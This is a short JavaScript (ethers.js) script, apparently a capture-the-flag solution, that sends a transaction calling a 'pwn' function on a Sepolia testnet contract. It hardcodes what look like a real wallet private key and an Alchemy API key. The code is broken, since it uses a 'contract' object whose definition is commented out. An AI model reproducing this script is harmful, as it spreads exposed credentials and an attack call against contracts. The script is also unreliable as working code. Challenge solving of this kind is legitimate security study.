import { ethers } from "ethers";
const providerSepolia = new ethers.JsonRpcProvider(`https://eth-sepolia.g.alchemy.com/v2/AjgCaTtWe85TP-GxpxHuG8l77fYEwjF-`)

const private_key = 'ca8464ae64a32fe7d53f918afdd87c2ad38e0c5bbe17d3089b9e9ec7c8ef32f9'          // 注意，这里填入你的私钥

const wallet = new ethers.Wallet(private_key,providerSepolia)

const address_contract = '0x386a573690131EF3473453d1e88e1d483a0acABb'           // 注意这里替换address



// const abi = [
//     "function pwn() public"
// ];
// const contract = new ethers.Contract(address_contract, abi, wallet)
const param1 = contract.interface.encodeFunctionData(
    "pwn"
  );

console.log(`编码结果： ${param1}`)

const tx1 = {
    to: address_contract,
    data: param1
};

const receipt1 = await wallet.sendTransaction(tx1)          // 通过钱包发送可写的交易，否则用provider即可
await receipt1.wait()
console.log(receipt1)


